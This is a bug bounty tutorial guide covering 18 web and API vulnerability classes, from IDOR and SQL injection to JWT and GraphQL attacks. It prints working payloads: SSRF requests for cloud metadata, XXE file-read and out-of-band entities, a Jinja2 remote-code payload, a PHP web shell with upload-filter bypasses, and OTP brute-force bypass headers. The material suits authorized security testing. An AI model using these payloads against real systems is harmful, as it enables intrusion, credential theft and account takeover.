# 🛡️ Server-Side & API Bug Bounty Bible
> Your complete reference guide for finding high and critical severity bugs

---

## How To Use This Bible

For every bug in this guide, follow this loop:
1. Read the concept + example here
2. Read 3-5 real HackerOne reports on that bug type
3. Go hunt it live on a real target
4. Come back when stuck

---

## Table of Contents

### Server-Side Bugs
1. [IDOR – Insecure Direct Object Reference](#1-idor)
2. [Broken Access Control](#2-broken-access-control)
3. [SQL Injection](#3-sql-injection)
4. [SSRF – Server-Side Request Forgery](#4-ssrf)
5. [XXE – XML External Entity Injection](#5-xxe)
6. [SSTI – Server-Side Template Injection](#6-ssti)
7. [Authentication Bypass](#7-authentication-bypass)
8. [Business Logic Flaws](#8-business-logic-flaws)
9. [Race Conditions](#9-race-conditions)
10. [File Upload Vulnerabilities](#10-file-upload-vulnerabilities)

### API-Specific Bugs
11. [Mass Assignment](#11-mass-assignment)
12. [Broken Object Level Authorization – BOLA](#12-bola)
13. [Broken Function Level Authorization – BFLA](#13-bfla)
14. [API Rate Limiting Bypass](#14-api-rate-limiting-bypass)
15. [JWT Attacks](#15-jwt-attacks)
16. [GraphQL Vulnerabilities](#16-graphql-vulnerabilities)
17. [Exposed Sensitive API Endpoints](#17-exposed-sensitive-api-endpoints)
18. [API Versioning Bugs](#18-api-versioning-bugs)

---

---

# SERVER-SIDE BUGS

---

## 1. IDOR

### What Is It?
IDOR (Insecure Direct Object Reference) happens when an application uses a user-controlled input — like an ID number — to access objects (files, records, data) without checking if the user actually has permission to access that object.

### Why Is It Vulnerable?
The server trusts the ID sent by the user without verifying ownership. There is no authorization check saying "does this user own this resource?"

### How It Works
```
User A has account ID: 1001
User B has account ID: 1002

User B sends request:
GET /api/user/1001/profile

Server returns User A's profile to User B — no check performed.
```

### How To Find It
- Create two accounts (attacker + victim)
- Perform actions as victim (create orders, messages, files)
- In Burp Suite, look for any numeric or UUID-based IDs in requests
- Replace victim's ID with attacker's ID and vice versa
- Look in: URL parameters, request body, headers, cookies

### Where To Look
```
/api/users/1234          → change 1234
/invoice?id=5678         → change 5678
/download?file_id=999    → change 999
order_id=ABC123          → change to another order ID
```

### Real Example
```
GET /api/v1/orders/9921 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <attacker_token>

Response:
{
  "order_id": 9921,
  "user": "victim@email.com",
  "card_last4": "4242",
  "address": "123 Victim Street"
}
```
Attacker accessed victim's order details just by changing the ID.

### Payout Range
$200 – $10,000 depending on data exposed

### HackerOne Search
Search: `IDOR` on hackerone.com/hacktivity

---

## 2. Broken Access Control

### What Is It?
Broken Access Control is when users can access resources, pages, or actions they should not have permission to. It's a broader category that includes IDOR but also covers privilege escalation, accessing admin functions, and bypassing role restrictions.

### Why Is It Vulnerable?
The application doesn't enforce what each role (user, admin, moderator) can actually do. Authorization checks are missing, incomplete, or only done on the frontend.

### How It Works
```
Normal user tries to access admin panel:
GET /admin/users HTTP/1.1

Server should return 403 Forbidden.
But returns 200 OK with full admin data — no role check.
```

### How To Find It
- Log in as a regular user
- Try accessing admin URLs directly: `/admin`, `/dashboard/admin`, `/manage`
- Use Burp to capture admin requests (from a second admin account if available)
- Replay those requests with your regular user token
- Try changing role parameters: `role=user` → `role=admin`

### Common Bypass Techniques
```
Add headers:
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1

Path manipulation:
/admin/users → /ADMIN/users
/admin/users → /admin/users/
/admin/users → /%61dmin/users
```

### Real Example
```
POST /api/user/update HTTP/1.1

{"user_id": 123, "role": "user"}

Attacker modifies to:
{"user_id": 123, "role": "admin"}

Response: {"status": "updated", "role": "admin"}
```
Attacker escalated their own privileges to admin.

### Payout Range
$500 – $20,000

---

## 3. SQL Injection

### What Is It?
SQL Injection happens when user input is inserted directly into a SQL query without sanitization, allowing the attacker to manipulate the database query itself.

### Why Is It Vulnerable?
The application builds SQL queries by concatenating user input as a string instead of using parameterized queries or prepared statements.

### How It Works
```
Vulnerable query:
SELECT * FROM users WHERE username = '$input'

Attacker sends: ' OR '1'='1

Final query:
SELECT * FROM users WHERE username = '' OR '1'='1'

Returns all users — authentication bypassed.
```

### How To Find It
- Inject a single quote `'` in every input field, URL parameter, header
- Look for SQL errors in the response
- Try `'--`, `' OR 1=1--`, `1' AND SLEEP(5)--`
- Check search bars, login forms, filter parameters, API parameters
- Use time-based payloads to detect blind SQLi: `' AND SLEEP(5)--`

### Types
| Type | How It Works |
|------|-------------|
| In-band | Error or data returned directly in response |
| Blind Boolean | Ask true/false questions, observe different responses |
| Blind Time-based | Inject SLEEP(), measure response time |
| Out-of-band | Data exfiltrated via DNS or HTTP to attacker server |

### Real Example
```
GET /api/products?category=electronics' AND SLEEP(5)-- HTTP/1.1

Response delayed by 5 seconds → Blind SQL Injection confirmed

Next step: extract database version, then tables, then data
' AND SLEEP(5) IF (1=1) ELSE SLEEP(0)--
```

### Payout Range
$1,000 – $30,000 (critical if it reaches sensitive tables)

---

## 4. SSRF

### What Is It?
SSRF (Server-Side Request Forgery) tricks the server into making HTTP requests to internal systems or external URLs on behalf of the attacker — systems that are normally not accessible from the internet.

### Why Is It Vulnerable?
The application fetches URLs or resources based on user input without validating or restricting what destinations are allowed.

### How It Works
```
App fetches a URL you provide:
POST /api/fetch-preview
{"url": "https://example.com/image.jpg"}

Attacker sends:
{"url": "http://169.254.169.254/latest/meta-data/"}

Server fetches AWS metadata and returns it — exposing cloud credentials.
```

### How To Find It
Look for any feature that:
- Fetches URLs (link preview, webhook, PDF generator, image import)
- Integrates with external services
- Has parameters like: `url=`, `endpoint=`, `redirect=`, `fetch=`, `src=`

### Payloads To Try
```
Internal network:
http://127.0.0.1/admin
http://localhost:8080
http://192.168.1.1

Cloud metadata:
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/ (GCP)
http://169.254.169.254/metadata/instance (Azure)

Bypass filters:
http://127.0.0.1 → http://2130706433 (decimal IP)
http://127.0.0.1 → http://0x7f000001 (hex IP)
http://127.0.0.1 → http://127.1
```

### Real Example
```
POST /api/webhook/test HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "abc123...",
  "Token": "..."
}
```
Full AWS credentials leaked — critical severity.

### Payout Range
$500 – $50,000 (critical when it reaches cloud metadata or internal services)

---

## 5. XXE

### What Is It?
XXE (XML External Entity) injection happens when an application parses XML input that contains a reference to an external entity — allowing the attacker to read local files, perform SSRF, or execute denial of service.

### Why Is It Vulnerable?
The XML parser has external entity processing enabled, trusting user-supplied XML to define and load external resources.

### How It Works
```
Normal XML:
<user><name>John</name></user>

Malicious XML:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>

Server parses XML, loads /etc/passwd, returns its contents in response.
```

### How To Find It
- Look for any endpoint that accepts XML input
- Check Content-Type: `application/xml`, `text/xml`
- Look for file upload features that accept `.xml`, `.docx`, `.xlsx`, `.svg`
- Change JSON requests to XML and see if the server accepts it
- Look for SOAP APIs

### Payloads
```xml
<!-- Read local file -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
<data><value>&xxe;</value></data>

<!-- Blind XXE - exfiltrate via DNS -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-collaborator.burpcollaborator.net/">]>
<data><value>&xxe;</value></data>
```

### Real Example
```
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<import><data>&xxe;</data></import>

Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Payout Range
$500 – $10,000

---

## 6. SSTI

### What Is It?
SSTI (Server-Side Template Injection) happens when user input is embedded directly into a server-side template and evaluated by the template engine — allowing attackers to execute code on the server.

### Why Is It Vulnerable?
The application inserts user input into template strings without sanitization, treating attacker-controlled data as template syntax.

### How It Works
```
App generates email:
"Hello {{username}}, welcome!"

Attacker sends username: {{7*7}}

Server renders: "Hello 49, welcome!"

7*7 was executed — template injection confirmed.
Next step: execute system commands.
```

### How To Find It
- Inject template syntax in every input: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- Look for math being evaluated in the response
- Check: name fields, search bars, email fields, URL parameters
- Common in apps using: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble

### Detection Payloads By Engine
```
Jinja2 (Python):    {{7*7}} → 49
Twig (PHP):         {{7*7}} → 49
Freemarker (Java):  ${7*7} → 49
ERB (Ruby):         <%= 7*7 %> → 49
Smarty (PHP):       {7*7} → 49
```

### RCE Payload (Jinja2)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Real Example
```
POST /api/send-email HTTP/1.1
{"template": "Hello {{7*7}}, your order is ready"}

Response email:
"Hello 49, your order is ready"

→ SSTI confirmed → escalate to RCE
```

### Payout Range
$1,000 – $20,000 (critical if RCE is achieved)

---

## 7. Authentication Bypass

### What Is It?
Authentication bypass allows an attacker to access accounts or privileged areas without providing valid credentials — skipping the login process entirely.

### Why Is It Vulnerable?
Weak session management, flawed password reset logic, missing verification steps, or trusting client-side data for authentication decisions.

### Types & How To Find Them

**Password Reset Flaws:**
```
1. Request password reset for victim@email.com
2. Check if reset token is:
   - Predictable (sequential numbers, timestamps)
   - Reusable after use
   - Never expires
3. Try: change the email in reset link to your email
   /reset?token=abc123&email=victim@email.com
   → change to: /reset?token=abc123&email=attacker@email.com
```

**Response Manipulation:**
```
Login attempt returns:
{"success": false, "redirect": "/login"}

Change to:
{"success": true, "redirect": "/dashboard"}

Intercept in Burp → change false to true → forward
```

**2FA Bypass:**
```
1. Login with valid credentials
2. Skip 2FA page — go directly to /dashboard
3. Try: submit empty OTP code
4. Try: reuse an old valid OTP
5. Try: brute force 4-6 digit code (if no rate limiting)
```

### Real Example
```
POST /api/reset-password HTTP/1.1
{"token": "resetabc123", "new_password": "hacked123"}

Original request ties token to email in URL parameter.
Attacker requests their own reset token, then:

POST /api/reset-password HTTP/1.1
{"token": "attacker_token", "email": "victim@email.com", "new_password": "hacked"}

Server resets victim's password using attacker's token.
```

### Payout Range
$1,000 – $50,000 (critical — full account takeover)

---

## 8. Business Logic Flaws

### What Is It?
Business logic flaws are vulnerabilities in the application's intended workflow — not technical bugs, but flaws in how the business rules are implemented. The application does what you tell it, but you're telling it to do something it shouldn't allow.

### Why Is It Vulnerable?
Developers implement features but don't consider all the ways users could abuse the intended flow — negative quantities, skipping steps, applying discounts multiple times.

### Common Types

**Price Manipulation:**
```
POST /api/checkout HTTP/1.1
{"item_id": 123, "quantity": -1, "price": 999.99}

Server calculates: -1 * 999.99 = -999.99
Applied as credit to attacker's account.
```

**Workflow Bypass:**
```
Normal flow: Step 1 → Step 2 → Step 3 → Payment → Order confirmed
Attacker skips payment step: Step 1 → Step 3 → Order confirmed
Order placed without payment.
```

**Coupon Abuse:**
```
Apply same coupon code multiple times in same checkout
Apply coupon after price is set, not before
Chain multiple single-use coupons
```

### How To Find It
- Map the entire application workflow in Burp
- Try doing steps out of order
- Try negative values, zero values, extremely large values
- Apply discounts/coupons multiple times
- Look for hidden parameters: `price`, `discount`, `quantity`, `role`

### Real Example
```
POST /api/apply-coupon HTTP/1.1
{"coupon": "SAVE50", "order_id": 1234}

Attacker sends same request 10 times:
Coupon applied 10 times → order total becomes negative → store owes attacker money.
```

### Payout Range
$1,000 – $100,000 (can be critical if financial loss to company)

---

## 9. Race Conditions

### What Is It?
Race conditions occur when an application performs operations that depend on timing, and an attacker exploits the window between a check and the actual action to perform something that should only happen once — multiple times.

### Why Is It Vulnerable?
The application checks a condition (e.g. "has coupon been used?") and then performs the action, but doesn't lock the resource during that window. Multiple simultaneous requests all pass the check before any of them update the state.

### How It Works
```
Normal flow:
1. Check: has coupon been used? → No
2. Apply coupon discount
3. Mark coupon as used

Race condition:
Send 20 requests simultaneously — all reach step 1 before any reach step 3
All 20 pass the check → coupon applied 20 times
```

### How To Find It
- Look for: one-time coupons, referral bonuses, free credits, withdrawal limits
- Use Burp Suite's **Turbo Intruder** or **Repeater** (send group in parallel)
- Send 20-50 identical requests simultaneously
- Look for any "use once" functionality

### Real Example
```
POST /api/redeem-coupon HTTP/1.1
{"code": "FREEMONTH"}

Send 50 simultaneous requests using Burp Turbo Intruder:
→ Coupon redeemed 47 times
→ 47 months of free subscription added to account
```

### Payout Range
$500 – $15,000

---

## 10. File Upload Vulnerabilities

### What Is It?
File upload vulnerabilities occur when an application allows users to upload files but doesn't properly validate the file type, content, or name — allowing attackers to upload malicious files like web shells.

### Why Is It Vulnerable?
The server only validates file extension or MIME type on the client side or in a bypassable way, without checking actual file content.

### How To Find It
- Find any file upload feature
- Try uploading a `.php` web shell
- If blocked, try bypassing:
  - Change extension: `.php5`, `.phtml`, `.pHp`, `.php.jpg`
  - Change Content-Type: `image/jpeg` while keeping `.php` extension
  - Double extension: `shell.jpg.php`
  - Null byte: `shell.php%00.jpg`

### Web Shell Payload
```php
<?php system($_GET['cmd']); ?>
```

Upload as `shell.php`, then access:
```
https://target.com/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data)
```

### Real Example
```
POST /api/upload-avatar HTTP/1.1
Content-Type: multipart/form-data

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--

Response: {"url": "/uploads/avatars/shell.php"}

GET /uploads/avatars/shell.php?cmd=cat+/etc/passwd
→ Remote Code Execution achieved
```

### Payout Range
$1,000 – $50,000 (critical — RCE)

---
---

# API-SPECIFIC BUGS

---

## 11. Mass Assignment

### What Is It?
Mass assignment happens when an API automatically binds all request parameters to internal object properties — including properties the user should never be able to set, like `role`, `isAdmin`, `balance`, `verified`.

### Why Is It Vulnerable?
Frameworks like Rails, Laravel, and Spring auto-map request parameters to model attributes. If not explicitly protected, attackers can set any attribute.

### How To Find It
- Look at what fields the API returns in responses
- Try sending those same fields back in POST/PUT/PATCH requests
- Add extra fields: `"role": "admin"`, `"isAdmin": true`, `"verified": true`, `"balance": 99999`
- Look at API documentation if available — it often reveals internal fields

### Real Example
```
Normal registration:
POST /api/register HTTP/1.1
{"username": "attacker", "password": "pass123", "email": "a@b.com"}

Response:
{"id": 456, "username": "attacker", "role": "user", "verified": false}

Attacker adds extra fields to registration:
POST /api/register HTTP/1.1
{"username": "attacker", "password": "pass123", "email": "a@b.com", "role": "admin", "verified": true}

Response:
{"id": 456, "username": "attacker", "role": "admin", "verified": true}
```
Attacker registered as admin.

### Payout Range
$500 – $15,000

---

## 12. BOLA

### What Is It?
BOLA (Broken Object Level Authorization) is the API version of IDOR. It's the #1 vulnerability in the OWASP API Security Top 10. The API exposes endpoints that handle object identifiers without validating that the requesting user has permission to access that specific object.

### Why Is It Vulnerable?
The API authenticates the user but doesn't verify that the specific object being requested belongs to or is accessible by that user.

### How To Find It
- Map all API endpoints using Burp
- Look for object IDs in: URL path, query parameters, request body
- Test with two accounts — swap IDs between them
- Try accessing: `/api/v1/users/{id}`, `/api/orders/{id}`, `/api/documents/{id}`

### Real Example
```
Account A (attacker):
GET /api/v1/invoices/1001 → {"invoice_id": 1001, "amount": 500, "user": "attacker"}

Account B (victim):
GET /api/v1/invoices/1002 → {"invoice_id": 1002, "amount": 800, "user": "victim"}

Attacker sends:
GET /api/v1/invoices/1002
Authorization: Bearer <attacker_token>

Response: Full invoice details of victim — BOLA confirmed.
```

### Payout Range
$200 – $10,000

---

## 13. BFLA

### What Is It?
BFLA (Broken Function Level Authorization) occurs when an API doesn't restrict access to functions (endpoints) based on user role — allowing regular users to call admin-only API functions.

### Why Is It Vulnerable?
The API has different functions for different roles but only enforces authorization on the UI, not on the API itself.

### How To Find It
- Find admin API endpoints: look in JS files, API docs, Burp history
- Common admin endpoints: `/api/admin/`, `/api/v1/admin/users`, `/api/manage/`
- Send requests to admin endpoints using regular user token
- Try HTTP method switching: GET works, try POST/DELETE/PUT on same endpoint

### Real Example
```
Admin can delete users:
DELETE /api/v1/admin/users/789
Authorization: Bearer <admin_token>
→ 200 OK: User deleted

Attacker (regular user) tries:
DELETE /api/v1/admin/users/789
Authorization: Bearer <attacker_token>
→ 200 OK: User deleted ← BFLA! Should have returned 403.
```

### Payout Range
$500 – $20,000

---

## 14. API Rate Limiting Bypass

### What Is It?
Rate limiting bypass allows attackers to send more requests than the API intends to allow — enabling brute force attacks on OTPs, passwords, or overwhelming the API.

### Why Is It Vulnerable?
Rate limiting is implemented only on one factor (like IP address) and can be bypassed by rotating IPs, changing headers, or modifying request structure.

### How To Find It
- Find: login endpoints, OTP verification, password reset, search APIs
- Send many requests and see when you get rate limited
- Then try bypass techniques

### Bypass Techniques
```
Rotate IP via headers:
X-Forwarded-For: 1.2.3.4  (change each request)
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4

Add null byte or space to parameter:
{"otp": "1234 "}
{"otp": " 1234"}

Add array:
{"otp": ["1234"]}
```

### Real Example
```
POST /api/verify-otp HTTP/1.1
{"otp": "1234"}

After 5 attempts → rate limited.

Add header to bypass:
POST /api/verify-otp HTTP/1.1
X-Forwarded-For: 5.5.5.5
{"otp": "1234"}

Rate limit reset — brute force all 10,000 OTP combinations.
```

### Payout Range
$200 – $5,000 (higher if leads to account takeover)

---

## 15. JWT Attacks

### What Is It?
JWT (JSON Web Token) attacks exploit weaknesses in how tokens are generated, signed, or verified — allowing attackers to forge tokens, elevate privileges, or bypass authentication entirely.

### Why Is It Vulnerable?
Poor key management, weak secrets, or flawed verification logic in JWT implementation.

### Types & Payloads

**Algorithm None Attack:**
```
Change algorithm to "none" in header:
{"alg": "none", "typ": "JWT"}

Remove signature — server accepts unsigned token.
```

**Weak Secret Brute Force:**
```
Use hashcat to crack weak JWT secret:
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**Algorithm Confusion (RS256 → HS256):**
```
Server uses RS256 (asymmetric).
Change alg to HS256 (symmetric).
Sign with server's PUBLIC key as the HMAC secret.
Server verifies using public key — attacker controls payload.
```

### How To Find It
- Capture any JWT token from login
- Decode at jwt.io
- Look at payload: `{"user_id": 123, "role": "user"}`
- Try changing `role` to `admin` and re-signing with weak secret
- Use Burp's JWT Editor extension

### Real Example
```
Original JWT payload:
{"user_id": 456, "role": "user", "exp": 9999999999}

Attacker modifies to:
{"user_id": 456, "role": "admin", "exp": 9999999999}

Signed with cracked secret "secret123"
Server accepts modified token → attacker has admin access.
```

### Payout Range
$500 – $20,000

---

## 16. GraphQL Vulnerabilities

### What Is It?
GraphQL APIs have unique vulnerabilities due to their flexible query structure — including introspection leaking the full schema, batching attacks to bypass rate limits, and missing authorization on nested objects.

### Why Is It Vulnerable?
GraphQL's power (flexible queries, nested objects) becomes a vulnerability when authorization isn't enforced at every resolver level.

### How To Find It
- Look for `/graphql`, `/api/graphql`, `/v1/graphql` endpoints
- Test introspection first — it reveals the entire API structure

### Key Attacks

**Introspection (Schema Discovery):**
```graphql
{__schema{types{name,fields{name}}}}
```
Returns full API schema — all queries, mutations, types, fields.

**IDOR via GraphQL:**
```graphql
{
  user(id: "victim_id_here") {
    email
    address
    paymentMethods {
      cardNumber
    }
  }
}
```

**Batching Attack (Rate Limit Bypass):**
```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass3\") }"}
]
```
Send 1000 login attempts in a single HTTP request.

### Real Example
```
POST /graphql HTTP/1.1
{"query": "{__schema{types{name,fields{name,args{name}}}}}"}

Response reveals hidden admin queries:
adminDeleteUser, adminGetAllUsers, adminResetPassword

Attacker calls:
{"query": "{adminGetAllUsers{email, password_hash, address}}"}
→ Full database dump
```

### Payout Range
$500 – $30,000

---

## 17. Exposed Sensitive API Endpoints

### What Is It?
APIs often have hidden, undocumented, or forgotten endpoints that expose sensitive functionality — debug endpoints, internal admin APIs, development endpoints left in production.

### Why Is It Vulnerable?
Development endpoints are not removed before production deployment. Security is applied to known endpoints but forgotten ones remain exposed.

### How To Find It
- Use **ffuf** or **dirsearch** to brute force API paths
- Look in JavaScript files — developers often hardcode API endpoints
- Check old API versions: `/api/v1/`, `/api/v2/` — older versions may lack security
- Look in: Wayback Machine, Google dorking, Shodan, API docs

### Discovery Commands
```bash
# Brute force API endpoints
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt

# Find endpoints in JS files
grep -r "api/" *.js
grep -r "endpoint" *.js

# Google dork
site:target.com inurl:api
site:target.com filetype:js api
```

### Real Example
```
Attacker finds in app.js:
const ADMIN_API = '/api/internal/v1/admin';

Tests:
GET /api/internal/v1/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

Response: Full list of all users with emails, hashed passwords, addresses
→ Exposed internal API endpoint with no authorization check
```

### Payout Range
$500 – $25,000

---

## 18. API Versioning Bugs

### What Is It?
When companies release new API versions with better security, they often forget to properly secure or deprecate old versions — leaving `/api/v1/` vulnerable even when `/api/v2/` is secure.

### Why Is It Vulnerable?
Security fixes are applied to the latest version but old versions remain live and lack the same protections.

### How To Find It
- Find current API version from traffic: `/api/v3/users`
- Try older versions: `/api/v2/users`, `/api/v1/users`
- Try: `/api/v1/`, `/api/v2/`, `/v1/`, `/v2/`, `/old/`, `/legacy/`
- Old versions often lack: rate limiting, authorization checks, input validation

### Real Example
```
Current secure endpoint:
GET /api/v3/user/profile → Requires MFA, strict auth checks

Attacker tries old version:
GET /api/v1/user/profile → No MFA check, returns all user data

Or with BOLA:
GET /api/v1/user/1234 → No auth check at all on old version
→ Access any user's data without authentication
```

### Payout Range
$300 – $15,000

---

---

# YOUR HUNTING CHECKLIST

Use this for every target you test:

## Recon First
- [ ] Find all subdomains
- [ ] Find all API endpoints (JS files, Burp history, ffuf)
- [ ] Find API documentation
- [ ] Create two test accounts

## Server-Side Checks
- [ ] Test every ID parameter for IDOR
- [ ] Try accessing admin URLs with regular account
- [ ] Inject `'` in every input — check for SQL errors
- [ ] Find any URL/webhook fetch feature — test SSRF
- [ ] Find XML input — test XXE
- [ ] Inject `{{7*7}}` in template fields — test SSTI
- [ ] Test password reset flow thoroughly
- [ ] Test 2FA bypass
- [ ] Find file upload — try uploading PHP shell
- [ ] Find "use once" features — test race conditions

## API-Specific Checks
- [ ] Add `role`, `isAdmin`, `verified` to every POST/PUT — test mass assignment
- [ ] Swap object IDs between accounts — test BOLA
- [ ] Call admin API endpoints with regular token — test BFLA
- [ ] Hit rate limits then try bypass headers — test rate limiting
- [ ] Decode every JWT — test weak secrets, alg:none
- [ ] Find GraphQL — run introspection query
- [ ] Try `/api/v1/` if app uses `/api/v2/` or `/api/v3/`
- [ ] Search JS files for hidden endpoints

---

# RESOURCES TO KEEP OPEN WHILE HUNTING

| Resource | URL | Purpose |
|----------|-----|---------|
| HackerOne Hacktivity | hackerone.com/hacktivity | Real disclosed reports |
| OWASP API Top 10 | owasp.org/API-Security | API vuln reference |
| PayloadsAllTheThings | github.com/swisskyrepo/PayloadsAllTheThings | Payload cheatsheets |
| PortSwigger Web Academy | portswigger.net/web-security | Learn + practice |
| PentesterLand | pentester.land | Curated writeups |
| Burp Collaborator | burpcollaborator.net | Out-of-band detection |

---

*This bible covers the bugs that pay. Go hunt.*
